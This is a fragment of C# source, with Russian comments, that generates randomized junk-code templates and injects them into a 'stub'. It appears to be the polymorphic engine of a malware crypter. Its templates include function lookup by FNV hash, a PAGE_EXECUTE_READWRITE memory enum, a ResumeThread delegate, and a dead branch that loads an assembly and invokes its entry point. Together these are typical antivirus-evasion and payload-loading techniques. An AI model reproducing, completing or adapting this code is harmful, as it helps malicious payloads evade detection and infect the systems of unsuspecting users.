			    %$#@additionaltriggerFNVHash8@#$%
		        %$#@additionaltriggerFNVHash9@#$%
		        %$#@additionaltriggerFNVHash10@#$%
                %$#@basictriggerhash@#$% *= %$#@basictriggerfnv_prime@#$%;
			    %$#@additionaltriggerFNVHash11@#$%
		        %$#@additionaltriggerFNVHash12@#$%
		        %$#@additionaltriggerFNVHash13@#$%
                %$#@basictriggerhash@#$% ^= %$#@basictriggerstr0@#$%[i];
			    %$#@additionaltriggerFNVHash14@#$%
		        %$#@additionaltriggerFNVHash15@#$%
		        %$#@additionaltriggerFNVHash16@#$%
            }
			%$#@additionaltriggerFNVHash0e@#$%
		    %$#@additionaltriggerFNVHash1e@#$%
		    %$#@additionaltriggerFNVHash2e@#$%
            return %$#@basictriggerhash@#$%;
        } ";


                ReplaceAllUniqueTriggersBase(ref str0, ref strtemp);// заполняем все триггеры имен
                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic26(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = @" private enum %$#@basictriggerAllocationProtectEnum@#$% : uint
        {
            %$#@basictriggerPAGE_EXECUTE@#$% = 0x00000010,
            %$#@basictriggerPAGE_EXECUTE_READ@#$% = 0x00000020,
            %$#@basictriggerPAGE_EXECUTE_READWRITE@#$% = 0x00000040,
            %$#@basictriggerPAGE_EXECUTE_WRITECOPY@#$% = 0x00000080,
            %$#@basictriggerPAGE_NOACCESS@#$% = 0x00000001,
            %$#@basictriggerPAGE_READONLY@#$% = 0x00000002,
            %$#@basictriggerPAGE_READWRITE@#$% = 0x00000004,
            %$#@basictriggerPAGE_WRITECOPY@#$% = 0x00000008,
            %$#@basictriggerPAGE_GUARD@#$% = 0x00000100,
            %$#@basictriggerPAGE_NOCACHE@#$% = 0x00000200,
            %$#@basictriggerPAGE_WRITECOMBINE@#$% = 0x00000400
        } ";


                ReplaceAllUniqueTriggersBase(ref str0, ref strtemp);// заполняем все триггеры имен
                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic27(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = @" [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate int %$#@basictriggert_ResumeThread@#$%(IntPtr %$#@basictriggerhThread@#$%); ";


                ReplaceAllUniqueTriggersBase(ref str0, ref strtemp);// заполняем все триггеры имен
                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStatic28(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = @" private static %$#@basictriggerT@#$% %$#@basictriggerLoadFunction@#$%<%$#@basictriggerT@#$%>(IntPtr %$#@basictriggerlpModuleBase@#$%, uint %$#@basictriggerdwFunctionHash@#$%)
        {
		    %$#@additionaltriggerF315@#$%
			%$#@additionaltriggerF316@#$%
			%$#@additionaltriggerF317@#$%	
            IntPtr %$#@basictriggerlpFunction@#$% = IntPtr.Zero;
		    %$#@additionaltriggerF318@#$%
			%$#@additionaltriggerF319@#$%
			%$#@additionaltriggerF320@#$%				

            if (IntPtr.Zero == %$#@basictriggerlpFunction@#$%)
			    {
		        %$#@additionaltriggerF321@#$%
			    %$#@additionaltriggerF322@#$%
			    %$#@additionaltriggerF323@#$%					
                return default(%$#@basictriggerT@#$%);
				}
		    %$#@additionaltriggerF324@#$%
			%$#@additionaltriggerF325@#$%
			%$#@additionaltriggerF326@#$%					

            return (%$#@basictriggerT@#$%)Convert.ChangeType(Marshal.GetDelegateForFunctionPointer(%$#@basictriggerlpFunction@#$%, typeof(%$#@basictriggerT@#$%)), typeof(%$#@basictriggerT@#$%));
        } ";


                ReplaceAllUniqueTriggersBase(ref str0, ref strtemp);// заполняем все триггеры имен
                ModifyAllUniqueTriggersVoid(ref str0, ref strtemp);// заполняем все триггеры
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStruct0(ref string str0, ref string inNull0)//первый тип инструкции для переменных структур
            {
                string strtemp = " double %var123%;";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStruct1(ref string str0, ref string inNull0)//второй тип инструкции для переменных структур
            {
                string strtemp = " bool %var123%;";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStruct2(ref string str0, ref string inNull0)//третий тип инструкции для переменных структур
            {
                string strtemp = " string %var123%;";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStruct3(ref string str0, ref string inNull0)//четвертый тип инструкции для переменных структур
            {
                string strtemp = " ulong %var123%;";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStruct4(ref string str0, ref string inNull0)//пятый тип инструкции для переменных структур
            {
                string strtemp = " byte %var123%;";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyStruct5(ref string str0, ref string inNull0)//шестой тип инструкции для переменных структур
            {
                string strtemp = " short %var123%;";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                //MessageBox.Show(strtemp);

                return strtemp;
            }


            public static string InstructionAnyEnum0(ref string str0, ref string inNull0)//шестой тип инструкции для переменных структур
            {
                string strtemp = " %var123% = %value123%, ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomDouble().ToString();
                strtemp = strtemp.Replace("%value123%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAnyEnum1(ref string str0, ref string inNull0)//шестой тип инструкции для переменных структур
            {
                string strtemp = " %var123% = %value123%, ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomInt().ToString();
                strtemp = strtemp.Replace("%value123%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                //MessageBox.Show(strtemp);

                return strtemp;
            }


            public static string InstructionAny0(ref string str0, ref string inNull0)//первый тип инструкции для любого места
            {
                string strtemp = " int %var123%=%value123%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp) )//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomIntHuge().ToString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomIntHuge().ToString();
                }
                strtemp = strtemp.Replace("%value123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }


            public static string InstructionAny1(ref string str0, ref string inNull0)//второй тип инструкции для любого места
            {
                string strtemp = " string %var123%";
                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp + "=" + "\"" + sHelp + "\"" + "; ";

                //MessageBox.Show(string.Format("str= " + strtemp));

                return strtemp;
            }

            public static string InstructionAny2(ref string str0, ref string inNull0)//третий тип инструкции для любого места
            {
                string strtemp = " bool %var123%=%value123%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = stringbool(GenerateRandomBool());
                strtemp = strtemp.Replace("%value123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }

            public static string InstructionAny3(ref string str0, ref string inNull0)//четвертый тип инструкции для любого места
            {
                string strtemp = " double %var123%=%value123%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomDouble().ToString();
                strtemp = strtemp.Replace("%value123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }

            public static string InstructionAny4(ref string str0, ref string inNull0)//пятый тип инструкции для любого места
            {
                string strtemp = " double %var123%=%value123%; bool %var124%=%value124%; %var123%=%value125%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomDouble().ToString();
                strtemp = strtemp.Replace("%value123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = stringbool(GenerateRandomBool());
                strtemp = strtemp.Replace("%value124%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                sHelp = GenerateRandomDouble().ToString();
                strtemp = strtemp.Replace("%value125%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }

            public static string InstructionAny5(ref string str0, ref string inNull0)//шестой тип инструкции для любого места
            {
                string strtemp = " double %var123%=%value123%; bool %var124%=%value124%; %var124%=%value125%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomDouble().ToString();
                strtemp = strtemp.Replace("%value123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = stringbool(GenerateRandomBool());
                strtemp = strtemp.Replace("%value124%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                sHelp = stringbool(GenerateRandomBool());
                strtemp = strtemp.Replace("%value125%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }

            public static string InstructionAny6(ref string str0, ref string inNull0)//седьмой тип инструкции  только для функций
            {
                string strtemp = " double %var123%=%value123%; uint %var124%=%value124%; %var124%=%value125%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomDouble().ToString();
                strtemp = strtemp.Replace("%value123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomInt().ToString();
                strtemp = strtemp.Replace("%value124%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                sHelp = GenerateRandomInt().ToString();
                strtemp = strtemp.Replace("%value125%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                //MessageBox.Show(string.Format("str= " + strtemp));
                return strtemp;
            }

            public static string InstructionAny7(ref string str0, ref string inNull0)//восьмой тип инструкции  только для функций
            {
                string strtemp = " double %var123%=%value123%; long %var124%=%value124%; %var124%=%value125%; ";

                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomDouble().ToString();
                strtemp = strtemp.Replace("%value123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomDouble().ToString();
                strtemp = strtemp.Replace("%value124%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                sHelp = GenerateRandomDouble().ToString();
                strtemp = strtemp.Replace("%value125%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                //MessageBox.Show(string.Format("str= " + strtemp));
                return strtemp;
            }

            public static string InstructionAny8(ref string str0, ref string inNull0)//второй тип инструкции для любого места
            {
                string strtemp = " string %var123%";
                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp + "=" + "\"" + sHelp + "\"" + "; ";

                //MessageBox.Show(string.Format("str= " + strtemp));

                return strtemp;
            }

            public static string InstructionAny9(ref string str0, ref string inNull0)//девятый тип инструкции для любого места
            {
                string strtemp = " bool %var123%=true; while ( %var123%==true ) { %var123%=false; } ";
                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                //MessageBox.Show(string.Format("str= " + strtemp));

                return strtemp;
            }

            public static string InstructionAny10(ref string str0, ref string inNull0)//десятый тип инструкции для любого места
            {
                string strtemp = " bool %var123%=true; if ( %var123%==true ) { %var123%=%value124%; } ";
                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = stringbool(GenerateRandomBool());
                strtemp = strtemp.Replace("%value124%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                //MessageBox.Show(string.Format("str= " + strtemp));

                return strtemp;
            }

            public static string InstructionAny11(ref string str0, ref string inNull0)//одинадцатый тип инструкции для любого места
            {
                string strtemp = " bool %var123%=true; if ( %var123%==true ) { %var123%=%value124%; } else { %var123%=%value125%; } ";
                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = stringbool(GenerateRandomBool());
                strtemp = strtemp.Replace("%value124%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                sHelp = stringbool(GenerateRandomBool());
                strtemp = strtemp.Replace("%value125%", sHelp);//после того как нашли заменяем триггер на наше новое имя
                //MessageBox.Show(string.Format("str= " + strtemp));

                return strtemp;
            }

            public static string InstructionAny12(ref string str0, ref string inNull0)//двенадцатый тип инструкции для любого места
            {
                string strtemp = " int %var123%=%value124%; for (int %var124% = 0; %var124% < 1; ++%var124%) { %var123%=%value123%; } ";
                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomIntHuge().ToString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomIntHuge().ToString();
                }
                strtemp = strtemp.Replace("%value123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomIntHuge().ToString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomIntHuge().ToString();
                }
                strtemp = strtemp.Replace("%value124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                //MessageBox.Show(string.Format("str= " + strtemp));

                return strtemp;
            }

            public static string InstructionAny13(ref string str0, ref string inNull0)//двенадцатый тип инструкции для любого места
            {
                string strtemp = @" foreach ( byte %var123% in new byte[7] )
            {
                byte  %var124%;
                %var124%=%var123%;
            } ";
                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                //MessageBox.Show(string.Format("str= " + strtemp));

                return strtemp;
            }

            public static string InstructionAny14(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string sHelp = "";
                string strtemp = @" 
                 try
                 {
                 int %var123%;
                 %var123% = 0;
                 } 
                 catch (Exception) 
                 {
                 int %var124%;
                 %var124% = 1;
                 } ";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                //MessageBox.Show(strtemp);

                return strtemp;
            }

            public static string InstructionAny15(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = " bool %var122% ; %var122% = false ; if ( %var122% == true ) {  var %var123%=Delegate.CreateDelegate( typeof(float), typeof(int).GetMethod(" + "\"" + "%var124%" + "\"" + ")); } ";


                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var122%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }

            public static string InstructionAny16(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = " bool %var122% ; %var122% = false ; if ( %var122% == true ) {  var %var123%=Assembly.GetExecutingAssembly(); } ";


                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var122%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                return strtemp;
            }

            public static string InstructionAny17(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = @" %$#@additionaltriggerF0@#$%
			    %$#@additionaltriggerF1@#$%
			    %$#@additionaltriggerF2@#$% 
                bool %var122% ;
                %$#@additionaltriggerF3@#$%
			    %$#@additionaltriggerF4@#$%
			    %$#@additionaltriggerF5@#$%
                %var122% = false ;
                %$#@additionaltriggerF6@#$%
			    %$#@additionaltriggerF7@#$%
			    %$#@additionaltriggerF8@#$% 
                if ( %var122% == true ) 
                {  
                %$#@additionaltriggerF9@#$%
			    %$#@additionaltriggerF10@#$%
			    %$#@additionaltriggerF11@#$% 
                Assembly %var123%=Assembly.LoadFrom(" + "\"" + "%var124%" + "\"" + "); " +
                @"%$#@additionaltriggerF12@#$%
                %$#@additionaltriggerF13@#$%
			    %$#@additionaltriggerF14@#$%
                %var123%.EntryPoint.Invoke(null,null);
                %$#@additionaltriggerF15@#$%
			    %$#@additionaltriggerF16@#$%
			    %$#@additionaltriggerF17@#$%
                } ";


                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var122%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoidS(ref str0, ref strtemp);// заполняем все триггеры

                return strtemp;
            }

            public static string InstructionAny18(ref string str0, ref string inNull0)//шестой тип инструкции для static класса
            {
                string strtemp = @" %$#@additionaltriggerF0@#$%
			    %$#@additionaltriggerF1@#$%
